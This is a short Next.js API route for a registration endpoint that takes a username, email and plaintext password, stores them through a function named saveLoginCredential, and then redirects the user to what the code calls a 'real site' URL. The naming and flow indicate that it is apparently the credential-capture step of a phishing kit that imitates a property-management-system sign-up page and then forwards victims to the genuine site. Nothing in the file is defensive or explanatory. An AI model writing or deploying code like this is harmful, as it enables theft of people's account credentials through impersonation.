import { NextRequest, NextResponse } from "next/server";
import { saveLoginCredential } from "@/lib/credentials";
import { REAL_SITE_URLS } from "@/lib/routes";

export async function POST(request: NextRequest) {
  try {
    const { username, email, password } = await request.json();

    if (!username || !email || !password) {
      return NextResponse.json(
        { error: "All fields are required" },
        { status: 400 }
      );
    }

    try {
      await saveLoginCredential(request, username, password, "register", email);
    } catch {
      return NextResponse.json(
        { error: "Service temporarily unavailable" },
        { status: 500 }
      );
    }

    return NextResponse.json({
      success: true,
      redirect: REAL_SITE_URLS.pmsRegister,
    });
  } catch (err) {
    console.error("Register API error:", err);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}
